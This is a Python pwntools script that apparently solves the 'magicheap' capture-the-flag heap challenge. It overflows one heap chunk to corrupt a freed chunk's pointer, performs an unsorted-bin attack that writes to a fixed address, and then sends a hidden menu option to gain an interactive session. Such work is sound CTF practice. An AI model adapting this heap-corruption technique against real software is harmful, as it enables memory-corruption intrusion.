from pwn import *
elf = ELF('./magicheap')
io = process('./magicheap')
libc = elf.libc
context(log_level='debug',arch = 'amd64',os = 'linux')

def choice(c):
	io.recvuntil('Your choice :')
	io.sendline(str(c))

def add(size,content):
	choice(1)
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(content)

def edit(index,size,content):
	choice(2)
	io.recvuntil(':')
	io.sendline(str(index))
	io.recvuntil(':')
	io.sendline(str(size))
	io.recvuntil(':')
	io.send(content)

def free(index):
	choice(3)
	io.recvuntil(':')
	io.sendline(str(index))

magic = 0x6020C0


add(0x20,'AA')
add(0x100,'AAA')
add(0x60,'AAA')


free(1)

edit(0,0x40,'A'*0x20+p64(0)+p64(0x111)+p64(0)+p64(magic-0x10))
add(0x100,'A')

choice(4869)
#gdb.attach(io)



io.interactive()